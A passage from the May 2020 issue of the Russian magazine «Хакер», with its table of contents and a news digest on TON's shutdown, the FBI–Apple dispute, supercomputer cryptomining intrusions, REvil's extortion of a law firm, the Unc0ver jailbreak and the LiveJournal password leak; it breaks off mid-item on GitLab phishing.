
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                              Май 2020
            № 254
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  Исследование IPC Android и хукинг нативных библиотек

    Безопасность Android
  От первой до один надцатой версии

    Боевой смар тфон
  Делаем из устройства с Android «хакерфон» с помощью Termux и Kali

    Опас ный тренд
  Как ути лита Trend Micro для борьбы с руткитами позволила устанавливать руткиты

    Кибердель фин
  Как создавался Flipper — «швейцарский нож хакера»

    Бэкдоры в Active Directory
  Исполь зуем групповые политики, что бы сохранить дос туп к домену

    Глав ное об OSCP
  Как сда вать один из самых сложных экза менов по безопасности

    Вре донос под наблюдением
  Как работа ют сен дбоксы и как их обой ти

    WAF bypass
  Как выз нать IP сай та, который использует WAF или защиту от DDoS

    Путеводитель по «Империи»
  Разбира емся с фрей мворком PowerShell Empire от уста новки до закрепления в системе

    Читай и выпол няй
  Как работа ет эксплоит новой уязвимос ти в GitLab

   Мо ниторим мониторинг
  Что внут ри у приложения для изо ляции на дому

    Проблемы доверия
  Как разделить ключ меж ду людьми и зас тра ховаться от его потери

    История одного хакин тоша
  Как я собрал дешевый компьютер на macOS из веток и компоста

    Пот рошим Windows 10
  Легкий спо соб собрать свой дистри бутив Windows

    После гигабита
  Выбира ем и нас тра иваем оборудо вание для суперскоростной домашней сети

    Ядовитый питон
  Пишем на Python простейшую малварь: локер, шиф ровальщик и вирус

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





TON — ВСЁ
12 мая 2020 года Павел Дуров сообщил, что работа над блокчейн‐проектом
TON и криптовалю той Gram прекращается.
  Напомню, что первая информа ция об этом проекте появилась в фев‐
рале 2018 года, когда Павел Дуров зарегистри ровал компании TON Issuer
и Telegram Group в Комиссии по ценным бумагам и биржам США (SEC).
За два раунда закрытого ICO команде удалось привлечь инвестиции в раз‐
мере 1,7 миллиарда дол ларов от 175 инвесто ров в США и за их пределами.
  О том, что такое TON и что должен был представлять собой проект, мы
подробно рассказывали в прошлом году. Одна ко теперь опи санному в той
статье вряд ли суждено сбыться. Мы приводим перевод заявления Павла
Дурова, которое объясняет, с какими трудностя ми пришлось столкнуться
команде и почему проект завершен (спойлер: Дуров назвал основной при‐
чиной неудачи юридичес кие проблемы с властями США).



«Последние 2,5 года наши лучшие инженеры работали над блокчейн‐платформой нового
поколения под названием TON и крип товалютой, которую мы собирались назвать Gram. TON
была создана, чтобы разделять прин ципы децен трализации, разработанные Bitcoin и Ethereum,
но значительно превзой ти их по скорости и масштабируемости.
  Мы очень гордились результатом — созданная нами технология позволяла вести открытый,
свободный, децентрализован ный обмен цен ностя ми и идеями. Пос ле интеграции с Telegram
TON мог произвести революцию в сфере того, как люди хранят и переводят свои средства
и информацию.
   К сожалению, американский суд не позволил TON случиться. Почему? Представьте себе,
что несколько человек собрали деньги, чтобы пос троить на них золотодобывающую шахту,
а потом поделить между собой золото, которое та производит. А затем пришел судья и сказал:
„Эти люди вложили деньги в золотодобывающую шахту, потому что хотели получать прибыль.
Они не собирались добывать золото для себя, они хотели продавать его другим людям. Поэто‐
му им нельзя добывать золото“.
   Если это кажется вам какой‐то бессмыслицей, то вы не одиноки. Однако именно это про‐
изошло с TON (шахта) и Gram (золото). Судья использовал такую аргу ментацию и постановил,
что людям нельзя покупать или продавать Gram, как они могут покупать или продавать биткой‐
ны.
   Еще более парадок сально, что американский суд пос тановил, что Gram не может рас‐
пространяться не только на территории США, но и во всем мире. Почему? Потому что, по сло‐
вам судьи, граждане США могут найти какой‐либо способ дос тупа к платформе TON после ее
запуска. А значит, чтобы предотвратить это, Gram нельзя распространять нигде в мире, даже
если другие страны на планете, судя по всему, не имеют ничего против TON.
   Данное судебное решение подразумевает, что другие страны не обладают суверените том,
чтобы решать, что хорошо, а что плохо для их собс твен ных граждан. Но если США вдруг решит
запретить кофе и потребует закрыть все кофейни в Италии (потому там может оказаться
какой‐нибудь американец), сом неваемся, что на это кто‐либо сог ласится.
   И все же, несмотря на это, мы приняли трудное решение не про должать [работу над] TON.
   К сожалению, американский судья прав в одном: мы, люди за пределами США, можем
голосовать за наших президен тов и избирать наши парламен ты, но мы по‐прежнему зависим
от США, когда речь заходит о финан сах и технологиях (к счастью, не о кофе). США могут
использовать свой контроль над долларом и глобальной финан совой системой, чтобы зак рыть
любой банк или банковский счет в мире. Они могут использовать свой контроль над Apple
и Google для удаления приложений из App Store и Google Play. Так что да, это правда: дру гие
страны не обладают полным суверенитетом и возможностью разрешать что‐либо на своей тер‐
ритории. К сожалению, мы — 96% населения планеты, живущего в дру гих странах, — зависим
от принимающих решения лиц, которые избираются 4% жителей США.
   В будущем это может измениться. Однако сейчас мы находимся в порочном круге: нельзя
привнести больше баланса в излишне централизованный мир именно из‐за того, что он нас‐
только централизованный. Хотя мы пытались. Теперь мы оставляем это сле дующим поколе‐
ниям предпринимателей и раз работчиков, чтобы они под хватили это знамя и учились на наших
ошибках.
   Я пишу этот пост, чтобы официально объявить о том, что активная работа Telegram над TON
окончена. Вы можете видеть — или, возможно, уже видели — многочисленные сайты, исполь‐
зующие мое имя, бренд Telegram или аббревиатуру TON для продвижения сво их про ектов.
Не доверяйте им свои деньги или данные. Ни нынеш ние, ни бывшие чле ны нашей команды
не участвуют ни в одном из этих проектов. Хотя в будущем сети, основанные на технологии,
которую мы построили для TON, могут появиться, мы не будем иметь к ним никакого отно шения
и вряд ли когда‐нибудь станем поддерживать их каким‐либо образом. Так что будьте осторож‐
ны и не дайте никому ввести вас в заблужде ние.
   Я хочу завершить этот пост пожеланием удачи всем тем, кто стре мится к децен трализации,
равновесию и равенству в мире. Вы сражаетесь за правое дело. Эта битва вполне может ока‐
заться самой важной битвой нашего поколения. Мы надеемся, что вы добьетесь успеха там,
где мы потерпели неудачу».


В конце прошлого месяца Дуров уведомил инвесторов Telegram Open Net‐
work о том, что запуск платформы в очередной раз откладывается из‐за раз‐
бирательств с Комиссией по ценным бумагам и биржам США, а также из‐за
запрета аме риканского суда на рас пределение токенов Gram.
   Тогда Дуров предложил инвесторам сдел ку: забрать 72% вложенных
средств или подписать новый договор, дав проекту воз можность запустить
сеть до 30 апреля 2021 года. В пос леднем случае инвесторам предлагали
получение Gram или дру гой криптовалюты по итогу запуска либо воз‐
врат 110% средств. Дуров даже заявлял, что готов продать часть доли
в Telegram, если проект пос тигнет неудача.
   Чуть позже инвесторы получили еще нес колько писем от разработчиков,
где условия сделки были скорректирова ны. Так, американским инвесторам,
по сути, отказали в дальнейшем учас тии в проекте, но пообещали вер‐
нуть 72% средств. Остальным же сооб щили, что они все же не получат
ни Gram, ни другую криптовалю ту «из‐за неоп ределенного отношения соот‐
ветствующих регулирующих органов». Вместо этого инвесторам предложили
рассмотреть их вложения в проект как кредит под 52,77% годовых, чтобы те
могли рассчитывать на воз врат 110% сво их первоначальных вложений
к 2021 году.


5% БОТОВ В TWITTER


Эксперты компании NortonLifeLock создали бесплатное расширение для браузеров BotSight,
которое позволяет идентифицировать ботов в Twitter и разработано для борьбы с фальшивыми
новостями и дезинформацией.

Компания проанализировала с помощью этого инструмен та более 100 000 учетных записей
и обнаружила, что примерно 5% сообщений от общего чис ла публикуются ботами.

Анализ твитов, связанных с коронавирусом, показал, что от 6 до 18% пользовате лей, пишущих
на эту тему, — боты. Случайная же выбор ка из потока Twitter за тот же период показала 4–8%
ботов.





ФБР VS APPLE
В начале текущего года у Apple и ФБР вновь появился повод для конфликта:
правоохраните лям опять понадобилось взло мать iPhone преступника, а в
Купертино отказались помочь.
  Дело в том, что в декабре 2019 года на базе ВМС США (во Флориде,
в городе Пенсакола) произош ла стрельба. Огонь открыл 21‐летний Мохам‐
мед Саид аль‐Шамрани, офицер военно‐воздушных сил Саудовской Аравии,
который обучался в США. Он застрелил трех человек и был убит сам.
  ФБР было крайне заин тересовано в разблокировке двух iPhone, принад‐
лежавших аль‐Шамрани. И хотя у правоохранителей было раз решение суда
на взлом iPhone и доступ к данным, оба устройства оказались защищены
паролями и зашифрованы.
   Тогда представители Apple заявили, что сотрудничают со следс твием
и вообще всегда стремятся помогать пра воохранительным органам, однако
компания не помогла ФБР со взло мом озна ченных устройств и лишь напом‐
нила властям о своей точке зрения на бэкдоры в ПО, оставленные специаль‐
но для правоохранительных органов:



     «Мы всегда утвер жда ли, что не сущес тву ет такого понятия, как „бэк-
      дор для хороших пар ней“. Бэк доры так же могут использовать те, кто
      угрожает нашей национальной безопас ности и безопас ности данных
      наших клиентов.
       Се год ня пра воохранительные органы име ют дос туп к большему
      количес тву данных, чем когда‑либо в истории, поэтому аме риканцам
      не приходится выбирать между ослабле нием шиф рования и рас кры-
      тием дел. Мы считаем, что шиф рование крайне важно для защиты
     нашей стра ны и данных наших пользовате лей», — заявили в Apple.

Теперь Министерство юстиции США объявило, что техникам ФБР все же уда‐
лось взломать устрой ства аль‐Шамрани. Директор ФБР Крис Рэй (Chris Wray)
и генеральный прокурор США Уиль ям Барр (William Barr) рас критиковали
Apple за то, что компания не помогла следова телям.
   Рэй заявил, что на взлом двух смартфонов аль‐Шамрани ушло четыре
месяца кропотливой работы и на это потратили немалую сумму из средств
налогоплательщиков. При этом он подчеркнул, что использованная для взло‐
ма технология не может считать ся решени ем «более широкой проблемы
с устройствами Apple», так как она имеет весь ма ограниченное при менение.
  Министерство юстиции говорит, что теперь им удалось связать Мохам‐
меда Саида аль‐Шамрани с филиалом «Аль‐Каиды», действующим на Ара‐
вийском полуострове, причем, как выяснилось, сот рудничать с террористами
тот начал задолго до приезда в США.
  После этого «прорыва» ФБР начало контртеррорис тическую операцию
против одного из сооб щников аль‐Шамрани, и Рэй подчеркнул, что это могло
произойти быстрее, если бы Apple помогла специалистам ФБР. По его сло‐
вам, несмотря на публичные обвинения со стороны президента Трампа
и генерального прокурора Барра, Apple так и не участвовала в расследова‐
нии.



      «Apple приняла деловое и мар кетинговое решение и спроектирова ла
      свои смар тфоны таким обра зом, чтобы только пользователь мог раз-
      блокировать  их  содер жимое  независимо  от  обстоятельств. <…>
     Желание Apple пре дос тавить конфиденциальность своим клиентам
      понятно, но не любой ценой», — заявил гла ва ФБР.

Также Рэй раскритиковал технологические компании в целом, назвав их дей‐
ствия лицемерием. По его сло вам, они громко ратуют за шиф рование,
которое защищает даже от судебного ордера, но «с радостью подстраивают‐
ся под авторитарные режимы, ког да это соответству ет их биз нес‐интересам».



      «Нап ример, широко извес тно, что Apple сотрудничала как с Ком мунис-
      тичес кой  пар тией  Китая,  так и  с  рос сийски ми  влас тями,  чтобы
      перемес тить свои центры обра ботки данных и обес печить мас совую
      слежку со стороны этих пра вительств», — говорит Рэй.


ГЛАВА MICROSOFT ВСЕРЬЕЗ ОБЕСПОКОЕН
Глава Microsoft, как он признался в беседе с журналис тами The New York Times, всерьез обес‐
покоен тем, что из‐за пандемии коронавируса компании мас сово переве ли своих сот рудников
на удаленную работу. По мнению Наделлы, удален ная работа может иметь серьезные социаль‐
ные и психологические последс твия, так как видеозвонки и виртуальное обще ние не могут
заменить личных встреч.





→«Как выглядит выгорание? Что такое психичес кое здоровье? Как эти вещи взаимос вязаны
с построением сообщества? Я чувствую, что сейчас, работая удаленно, все мы, возможно, сжи‐
гаем часть созданного ранее социаль ного капитала. И что нам потом делать с этим? Я скучаю
по тому, как, приходя на физическое собрание, можно было поговорить с человеком рядом,
пообщаться с ним пару минут до или пос ле совещания»
— Сатья Наделла





МАЙНИНГ НА
СУПЕРКОМПЬЮТЕРАХ
Суперкомпьютеры по  всей Европе подверглись  атакам:  сверхмощ ные
машины заставили тайно майнить криптовалюту. Такие инциденты произошли
в Великобритании, Германии и Швейцарии, а также, по неподтвержденным
данным, от похожей ата ки постра дал высокопроизводительный вычислитель‐
ный центр в Испании.
  Первое сообщение об атаке пос тупило из Эдинбургского университета,
где размещается суперкомпь ютер ARCHER. Админис трация была вынуждена
приостановить работу ARCHER, а также сбросить SSH‐пароли для пре дот‐
вращения дальнейших атак.
  Затем немецкая организация BwHPC, которая координирует исследова‐
тельские проекты на суперкомпь ютерах в Германии, тоже объявила о том, что
пять из ее высокопроизводитель ных вычислитель ных клас теров будут вре‐
менно недоступны из‐за ана логичных проблем. Были отключены:
 • суперкомпьютер Hawk, уста новленный в Университете Штутгарта, в цен‐
   тре High‐Performance Computing Center Stuttgart;
 • кластеры bwUniCluster 2.0 и ForHLR  II в Технологическом институте Карл‐
   сруэ;
 • суперкомпьютер bwForCluster JUSTUS, размещенный в Ульмском универ‐
   ситете и использующийся химика ми и квантовыми информатиками;
 • суперкомпьютер bwForCluster BinAC, уста новленный в Тюбингенском уни‐
   верситете и применяющийся биоин форма тиками.

После этого сообщения о взло мах и вовсе посыпа лись как из рога изобилия.
Вот только некото рые из них:
 • ИБ‐исследователь Феликс фон Лейтнер сооб щил в своем блоге, что
   на суперкомпьютер, расположенный в Испании, тоже была совершена
   атака, в результате тот временно не работа ет;
 • о взломе заявили представители Вычислительного центра Лейбница
   (Leibniz Computing Center), работающего под патронажем Баварской ака‐
  демии наук. Из‐за ата ки там был отключен вычислительный клас тер;
 • о компрометации сооб щил и Юлихский исследовательский центр (Гер‐
   мания). Официальные лица заявили, что им пришлось закрыть дос туп
   к суперкомпьютерам JURECA, JUDAC и JUWELS;
 • Технический университет в Дрездене объявил, что вынужден приоста‐
   новить работу своего суперкомпьютера Taurus;
 • Швейцарский центр научных вычислений (CSCS) в Цюрихе тоже был
   вынужден  закрыть  внешний  дос туп   к  сво ей  суперкомпьютерной
   инфраструктуре из‐за атаки.

Интересно, что ни одна из перечисленных орга низа ций не сообщила прак‐
тически никаких подробностей случившегося. Ситу ация начала проясняться
уже позже: эксперты CSIRT (европейской организа ции, которая координиру‐
ет исследования суперкомпь ютеров по всей Европе) обнародовали образцы
мал вари и  индикаторы компрометации по  некоторым  из  инцидентов,
а немецкий эксперт Роберт Хеллинг опубликовал анализ малвари, заразив‐
шей  высокопроизводитель ный  вычислительный  кластер  на физическом
факультете Университета Людвига — Максимилиана в Мюнхене.
  Обнародован ные специалис тами образцы вредоносных программ были
проанализированы аналитиками компании Cado Security. Компания пишет,
что злоумышленники, похоже, получили доступ к суперкомпьютерным клас‐
терам через скомпрометированные учетные данные SSH (это косвенно под‐
тверждала администрация ARCHER).
  Судя по всему, учет ные данные были похищены у персонала универ‐
ситетов, которому доступ к суперкомпьютерам был пре доставлен для выпол‐
нения вычислений. «Угнанные» SSH‐данные принадлежали уни верситетам
в Канаде, Китае и Польше.
   Хотя пока нет неопровержимых доказа тельств, что все атаки устроила
одна и та же хакерская группа, схожие имена фай лов малвари и сетевые
индикаторы указывают на то, что за всеми инцидентами могли стоять одни
и те же люди.
  Иссле дователи Cado Security полагают, что, получив доступ к ноде супер‐
компьютера, хакеры использовали  экспло ит для  уязвимости CVE‐2019‐
15666 и тем самым обеспечили себе root‐дос туп и смогли раз вернуть
на зараженном суперкомпь ютере майнер криптовалю ты Monero.
  При этом стоит отметить и еще один интересный факт: многие организа‐
ции, чьи суперкомпьютеры были ата кованы, ранее объявляли о том, что отда‐
ют приоритет иссле дова ниям, каса ющимся COVID‐19. В итоге существу ет
теория, что хакеры хотели похитить результаты этих исследований или поп‐
росту их саботировать.


ВРЕМЯ ПАТЧЕЙ

Время, которое проходит между официальным выпус ком патча Google и добавлени ем это го
исправления в прошивку смартфонов других производителей (OEM‐вен доров), называют
задержкой исправлений (patch delay). Аналитики ком пании SRLabs собрали информацию
о задержках исправлений, изучив ситуацию на 500 000 смартфонов.

В среднем на распространение патчей уходит 38 дней (против 44 дней в 2018 году).

Задержка исправлений в целом сократилась на 15%, но эти показатели сильно различаются
у разных производителей смартфонов.

Компании Google, Nokia и Sony быстрее всех интегрируют ежемесячные обновления в свои
кастомизированные версии Android, тогда как Xiaomi, htc и Vivo сильно отстают.





Nokia и Google применяют патчи «исключительно быс тро» и зачас тую вообще демонстрируют
так называемую от рицательную частоту обновлений, то есть Google пре дос тавляет вен‐
дорам обновления за месяц до того, как они будут опубликованы на сайте Android Security
Bulletin.





Нередко задер жки с распространением патчей воз никают и по вине самих про изво дителей.
Например, Xiaomi отдает приоритет патчам для более новых устройств, оставляя девайсы
под управлением Android 8 не у дел.





КОМПРОМАТ НА ТРАМПА
Хакерская группа, стоящая за раз работкой шифровальщика REvil (Sodinokibi),
взломала нью‐йоркскую юридичес кую фир му Grubman Shire Meiselas & Sacks
(GSMS). Услугами этой компании пользуются десятки мировых звезд: список
клиентов GSMS содержит такие имена, как Мадонна, Леди Гага, Элтон Джон,
Роберт де Ниро, Ники Минаж.
   Как это часто бывает в последнее время, хакеры не только зашиф ровали
данные пострадавшей компании, но и похитили множество файлов, связан‐
ных со звездными клиентами GSMS. Группировка утверждает, что общий объ‐
ем украденной информа ции сос тавил 756 Гбайт, включая контракты, номера
телефонов, адреса  электронной почты,  личную перепис ку,  соглашения
о неразглашении и многое другое.
  В качестве доказательства взло ма операторы REvil обнародовали неболь‐
шие фрагменты имеющихся у них документов. В одном случае это было юри‐
дическое соглашение от 2013 года, подписанное Кристиной Агилерой и дру‐
гим артистом, участвовавшим в одном из ее музыкальных проектов (сейчас
имя Агилеры уже отсутству ет в списке клиентов GSMS). Другой документ
представ лял собой сог лашение меж ду членом команды мирового турне
Мадонны 2019–2020 года и компанией Live Nation Tours. Эта бумага под‐
писана 17 июля 2019 года и содержит имя члена команды, а также его номер
социального страхования.


                                     Продолжение статьи →
← Начало статьи





  После взлома группировка дала постра давшей компании неделю на оплату
   выкупа. Когда этот срок истек, на сайте злоумыш ленни ков появилось новое
  сообщение. Операторы REvil заявили, что предста вители GSMS предложили
  им выплату в размере 365 тысяч долларов, тогда как взломщики требовали
  за украденные данные 21 миллион дол ларов. Так как в назначенный срок
  выкуп не был зап лачен, хакеры решили удвоить его (сумма составила ни мно‐
   го ни мало 42 миллиона долларов).
    Но основным козырем операторов REvil, из‐за которого они потребовали
  такую баснослов ную сумму от пострадавшей юридической фирмы, стали вов‐
  се не контракты звезд шоу‐бизнеса. Злоумышленники пригрозили GSMS, что
  опубликуют некий компромат на президента США Дональда Трампа.



         «Идет пред выбор ная гонка, а мы вов ремя наш ли кучу гряз ного белья.
       Мис тер Трамп, если вы  хотите  остаться пре зидентом, потыкайте
         в этих ребят острой палкой, в против ном слу чае можете нав сегда
         забыть об этих амбициях. А вам, избирате ли, можем сообщить, что
         пос ле такой публикации вы точ но не захотите видеть его пре зиден-
         том. Ну, пока опус тим детали. Срок — одна неделя», — гла сило заяв-
        ление соз дателей REvil.

  В ответ на это представители Grubman Shire Meiselas & Sacks сообщили, что
  уже сотрудничают с ФБР, а правоохранители рас ценивают угрозы группиров‐
   ки как «акт кибертерроризма».
    Похоже, увидев это, зло умышленники обиделись и для начала опуб ликова‐
  ли более 160 писем, в которых так или ина че упоминается Дональд Трамп.
  Стоит сказать, что ничего компрометирующего или секретного в этих пос‐
  ланиях не было вовсе, имя Трампа в основном просто упоминалось там
  вскользь.
     Также хакеры сооб щили, что если выкуп не зап латят, то каждую неделю
   в даркнете будут выставляться на аукцион данные клиентов GSMS (в алфавит‐
  ном порядке). Злоумышленники отмечали, что им все равно, кто в итоге купит
   эту информацию — сами звез ды, СМИ или шантажис ты, — главное, что груп‐
  пировка сумеет на этом зарабо тать.
     Через несколько дней группировка неожиданно объявила, что с ней свя‐
  зались некие люди, заинтересованные в «покуп ке всех данных о президенте
  США», которые хакеры накопили за время своей активнос ти. Опе раторы REvil
   пишут, что сделка уже состоялась и они остались довольны. Также злоумыш‐
  ленники отмечают, что держат свое слово, то есть теперь эта информация
  удалена и останется у неназ ванного покупа теля в единс твенном экземпляре.
    В итоге ИБ‐эксперты схо дятся во мнении, что у хакеров не было никакого
  компромата  на  президента США.  Злоумышленники  просто  пытались
  надавить на руководство GSMS. А якобы сос тоявшаяся сделка — лишь спо‐
  соб сохранить лицо.
    В новом послании создатели REvil сооб щили, что теперь планируют выс‐
   тавить на аукцион похищенные в GSMS фай лы, связанные с Мадонной.
  Начальная цена составля ет миллион долларов.


 22% РОССИЯН СТАЛИ БОЛЬШЕ РАБОТАТЬ


   Согласно исследованию «Лаборатории Кас перско го» о влиянии COVID‐19 на стиль работы,
   в период самоизоляции 22% рос сиян стали тратить на профес сиональную деятельность боль‐
  ше времени, чем раньше. При этом 56% опрошен ных заявили, что им удается чаще бывать
   с семьей и больше времени посвящать личным делам.





   Что касается киберугроз, 59% рос сиян используют личную почту для решения рабочих воп‐
   росов, и по ловина из них признают, что подобное использование возросло при удаленной
   работе. Целых 55% респондентов общаются по работе в мес сен дже рах, не одобренных IT‐
   отделами компаний, и 55% из них делают это чаще именно в новых обсто ятельствах.

  Любопытно, что на глобальном уровне меньшая доля сотрудников — 38% — использует личные
   мессенджеры для рабочих целей.





 UNC0VER
  Команда ИБ‐спе циалис тов и реверс‐инженеров представила новую версию
  джейлбрейка  Unc0ver  (5.0.0).  Этот  инстру мент  работает  практически
  для любых iPhone, даже с новейшей iOS 13.5 на борту.
     Авторы Unc0ver говорят, что он использует уязвимость нулевого дня
   в ядре iOS, о которой еще не знают специалисты Apple. Уязвимость была
  обнаружена одним из учас тников команды, который известен под псев‐
  донимом Pwn20wnd.
    Сам Pwn20wnd рассказывает, что впервые за пять лет джей лбрейк акту‐
  ален даже для текущей, наибо лее свежей версии опе рационной системы.
  В последний раз похожий инстру мент выпус кался в 2014 году. Дело в том, что
  обычно джейлбрейки эксплуатируют старые уяз вимос ти в iOS и, соответс‐
   твенно, не работают с актуальной версией операционной системы, где эти
  «дырки» уже исправлены. В ито ге владельцы джейлбрейкну тых устройств
  зачастую предпочитают прос то не обновлять ОС.
    Интересно, что при этом Pwn20wnd утверждает, будто использование
  неизвестной 0day‐проб лемы и джейлбрейк устройств с ее помощью никак
  не сказываются на безопасности. Якобы это не открывает устройства
  для атак. По мнению Pwn20wnd, специалисты Apple выпустят патч для новой
   уязвимости в ближайшие две‐три недели.
     Разработчики Unc0ver пишут, что они про тес тировали свой джей лбрейк
  на iOS версий от 11 до 13.5. Джейлбрейк не работа ет лишь для версий iOS
  с 12.3 по 12.3.2 и с 12.4.2 по 12.4.5.


  ТОРВАЛЬДС ПЕРЕШЕЛ НА AMD
   Линус Торвальдс давно известен как преданный поклонник Intel, он не «изме нял» компании
   больше пятнадцати лет. Но теперь, анонсируя Linux Kernel 5.7 RC7, «отец Linux» признался, что
   перешел на процессор AMD.
      Хотя Торвальдс мечтает ког да‐нибудь работать на компьютере с процес сором ARM, пока он
   крайне рад апгрейду на 32‐ядерный 64‐поточный Threadripper 3970X с кешем L3 объ‐
   емом 128 Мбайт.





  →«Одним из главных радостных событий на этой неделе для меня стало то, что я обно вил
   свою основную машину, и впервые за пятнадцать лет мой дес ктоп работает не на базе Intel.
   Нет, я еще не перешел на ARM, но теперь исполь зую AMD Threadripper 3970X»
  — Линус Торвальдс





 УТЕЧКА ИЗ ЖЖ
  В середине мая 2020 года в Telegram‐канале гла вы компании DeviceLock
  Ашота Оганесяна появилась информация об утечке данных 33,7 миллиона
  пользователей «Живого журнала» (он же ЖЖ, он же LiveJournal). Сооб щалось,
   что обнаруженный тек сто вый файл содержит 33 726 800 строк, сре ди которых
  можно найти идентификаторы пользователей, email‐адре са, ссылки на про‐
  фили пользовате лей, а также пароли в формате простого текста (при
  этом 795 402 стро ки были с пус тым паролем).
     Последующий анализ паролей показал, что 69% сочетаний почта/пароль
  оказались уникальными, то есть никогда раньше не встречались в других
   утечках.




  В конце месяца издание ZDNet опубликова ло материал, проливающий свет
  на подробности случившегося.
    Журналисты  пишут,  что ЖЖ,  судя по всему, пострадал  от  взлома
  еще в 2014 году, и слухи об этом долгие годы циркулировали в Сети. К при‐
   меру, о компрометации говорили в октябре 2018 года, когда пользователи
  ЖЖ массово сообщали, что в рамках шантажист ской sextortion‐кампании им
  присылали их старые, но уникальные пароли от LiveJournal.
     Хотя взлом 2014 года не был под твержден официально, в пос ледние
  месяцы атакам также подверглась и блогин говая платформа DreamWidth,
  созданная на основе кодовой базы LiveJournal. В серии постов и твитов раз‐
  работчики DreamWidth рас сказали о мас штабных credential stuﬃng атаках,
  которые они наблюдают в пос леднее время.
    Напомню, что этим термином обозначают ситуации, когда имена поль‐
  зователей и пароли похищаются с одних сайтов, а затем используются про‐
   тив других. То есть злоумышленники имеют уже готовую базу учетных данных
   (приобретенную в даркнете, собранную самостоятель но или полученную дру‐
  гим способом) и пытаются использовать эти данные, чтобы авторизоваться
  на каких‐либо сайтах и сервисах под видом своих жертв. К сожалению, мно‐
   гие используют для разных сервисов одинаковые логины и пароли, не меняя
   их годами, что и делает подоб ные ата ки весь ма эффективными.
    В DreamWidth утверждают, что хакеры использовали старые комбинации
  имен пользователей и паролей от LiveJournal для взлома учетных записей
  DreamWidth и размещали спам‐сообщения на сайте.
    Однако компания «Рамблер», которой при надлежит LiveJournal, по‐преж‐
  нему отказывалась признать факт компро метации, даже после того, как к ней
  обратились администраторы DreamWidth.
     Теперь же утечку поль зовательских данных из ЖЖ под твердил авторитет‐
  ный агрегатор утечек Have  I Been Pwned (HIBP). Адми нистрация сервиса
  получила копию БД пользователей LiveJournal и проиндекси ровала ее на сво‐
  ем сайте.
     Согласно информации HIBP, дамп содержит данные 26 372 781 поль‐
  зователя LiveJournal: имена пользователей, email‐адреса и пароли в виде
  открытого текста. Напомню, что это согласу ется с информацией Ашота Ога‐
  несяна, который подсчи тал, что дамп содержит примерно 22,5 миллиона уни‐
   кальных сочетаний поч та/пароль.
    Подтвердили существование дампа и аналитики ИБ‐компании KELA,
  которые нашли множество упо мина ний украденной базы данных и ее копии
   в разных местах хакерского андегра унда.
      Так, сначала KELA и ZDNet обна ружили нес коль ко объ явлений, размещен‐
  ных брокерами данных. В этих объявлениях хакеры сообщали, что хотят про‐
   дать или купить базу данных LiveJournal. То есть преступники хорошо знали
  о похищенных у ЖЖ данных и активно ими обменива лись.
     Судя по этим объявлениям, пос ле компромета ции ЖЖ в 2014 году хакеры
  продавали украденные данные в час тном порядке — передавали БД из рук
   в руки среди спамерских групп и операторов ботнетов. Так как этими дан‐
  ными обменивались снова и снова, информа ция в итоге просочилась
   в открытый доступ.
    Первое упоминание о том, что база данных LiveJournal стала общедос‐
   тупной, датировано июлем 2019 года. Тогда об этом объ явил ныне не сущес‐
   твующий сервис We Leak Info, торговавший ворованными данными.





  Со временем этот дамп стал доступен еще шире. К примеру, недавно БД
   LiveJournal продавали в даркнете по цене всего 35 долларов США. В объ‐
  явлении, которое показано на иллюстрации ниже, речь идет о 33 миллионах
   записей, но это лишь общий объем дампа до уда ления дублей.





  В конце концов БД LiveJournal была опубликова на на известном хакерском
  форуме,  откуда  практичес ки моментально  рас пространилась  повсюду,
  и теперь дамп бесплатно предлага ют в Telegram‐каналах и заливают в фай‐
  лообменники.





  ZDNet отмечает, что платформа DreamWidth до сих пор страдает от атак
  с использованием старых учетных данных, украденных у LiveJournal, хотя раз‐
  работчики компании выпус кают обновления и ста раются обезопасить своих
  пользователей.
    Но риску, конечно, подверга ются не только пользователи DreamWidth.
  Люди, которые использовали логины и пароли от ЖЖ на дру гих сайтах, тоже
   могут стать жертвами взло ма из‐за credential stuﬃng атак. Пользователям,
  которые меняли свой пароль от ЖЖ после 2014 года, скорее всего, ничто
  не угрожает, однако специалисты все равно советуют изменить пароли
   от любых других учетных записей, где мог ли повторно использоваться те же
   учетные данные.
    Интересно, что вчера ZDNet уда лось получить комментарий от предста‐
   вителей «Рамблера». Еще две недели назад в компании заявляли, что
  информация об  утечке данных «не соот ветс твует действительности —
   это одна из кликбейтных новос тей, задача которой — привлечь интерес
   к третьей стороне в данном вопросе».
    Сейчас представители холдинга Rambler Group по‐прежнему отрицают,
   что хакеры получили дос туп к их системам, но подтверждают существование
  дампа и говорят, что БД содержит информацию, которую хакеры долгие годы
  собирали из разных источников: зараженных малварью систем (данные
  похищены из браузеров) и брутфорс‐атак (хакеры попросту подбирали
  пароли от LiveJournal).



       «Мы пос тоянно проводим мониторинг рис ков по всем нашим продук-
        там и дела ем все для того, чтобы пользовате ли чувс твовали себя мак-
        симально защищенными. Мы проана лизирова ли заяв ленный мас сив
        и считаем, что он может быть ском пилирован из раз личных источни-
         ков и сфальсифицирован.
         В 2011–2012  годах мы  сталкивались  с инцидентами под бора
        паролей наших пользовате лей, но уже свы ше шес ти лет мы исполь-
        зуем сис тему защиты от подоз рительных авториза ций и усовер шенс-
         твовали механизм хра нения паролей. Для слу чаев несанкционирован-
         ного использования акка унтов мы раз работа ли все необходимые про-
         токолы.
        Мы регуляр но информируем наших пользовате лей о необходимос-
         ти сме ны пароля. Пароли пользовате лей, которые не меняли их дол-
         гое вре мя, были принудительно сброшены. Если пользовате ли стол-
         кну лись со сложностями при дос тупе к акка унту, они могут связаться
         со службой под дер жки ЖЖ», — заявили в пресс‑службе LiveJournal.


 КАЖДЫЙ ПЯТЫЙ СОТРУДНИК GITLAB УЯЗ ВИМ
  ПЕРЕД ФИШИНГОМ

   Платформа GitLab провела проверку безопасности, проанализировав, насколько работающие
